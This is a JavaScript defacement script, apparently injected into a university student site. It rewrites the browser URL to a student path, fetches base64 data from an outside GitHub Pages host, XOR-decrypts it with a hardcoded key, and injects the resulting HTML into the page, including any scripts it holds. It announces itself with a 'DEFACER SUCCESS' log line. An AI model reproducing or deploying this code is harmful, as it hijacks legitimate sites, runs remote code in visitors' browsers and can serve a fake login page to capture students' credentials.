function injectHTMLAndLoadResources(decryptedHTML) {
    // Create a temporary container to parse the HTML
    const tempDiv = document.createElement('div');
    tempDiv.innerHTML = decryptedHTML;

    // Inject non-script, non-link content into the document
    Array.from(tempDiv.children).forEach((child) => {
        if (child.tagName === 'SCRIPT' || child.tagName === 'LINK') {
            return; // Skip scripts and links for manual handling
        }
        document.body.appendChild(child);
    });

    // Handle external CSS files (link tags)
    const links = tempDiv.querySelectorAll('link[rel="stylesheet"]');
    links.forEach((link) => {
        const href = link.getAttribute('href');
        if (!document.querySelector(`link[href="${href}"]`)) {
            const newLink = document.createElement('link');
            newLink.rel = 'stylesheet';
            newLink.href = href;
            document.head.appendChild(newLink);
        }
    });

    // Handle external and inline script files
    const scripts = tempDiv.querySelectorAll('script');
    scripts.forEach((script) => {
        if (script.src) {
            // External script
            const src = script.getAttribute('src');
            if (!document.querySelector(`script[src="${src}"]`)) {
                const newScript = document.createElement('script');
                newScript.src = src;
                newScript.async = false; // Maintain script order
                document.head.appendChild(newScript);
            }
        } else {
            // Inline script
            const inlineScript = document.createElement('script');
            inlineScript.textContent = script.textContent;
            document.body.appendChild(inlineScript);
        }
    });
}


function xorEncryptDecrypt(decodedhtml, key) {
    let result = '';
    for (let i = 0; i < decodedhtml.length; i++) {
        result += String.fromCharCode(decodedhtml.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return result;
}

function deface() {
    history.replaceState(null, null, '/ucc/students/');
    fetch('https://cybercutie0.github.io/-/studentlogin.txt')
        .then(response => response.text()) // Get the response as text (HTML content)
        .then(data => {
            let decodedhtml = atob(data);
            let decryptedHTML = xorEncryptDecrypt(decodedhtml, 'fUCCk')
            // Replace the entire HTML of the current document
            injectHTMLAndLoadResources(decryptedHTML);
        })
        .catch(error => console.error('Error:', error));
}

console.log("DEFACER SUCCESS");
deface();
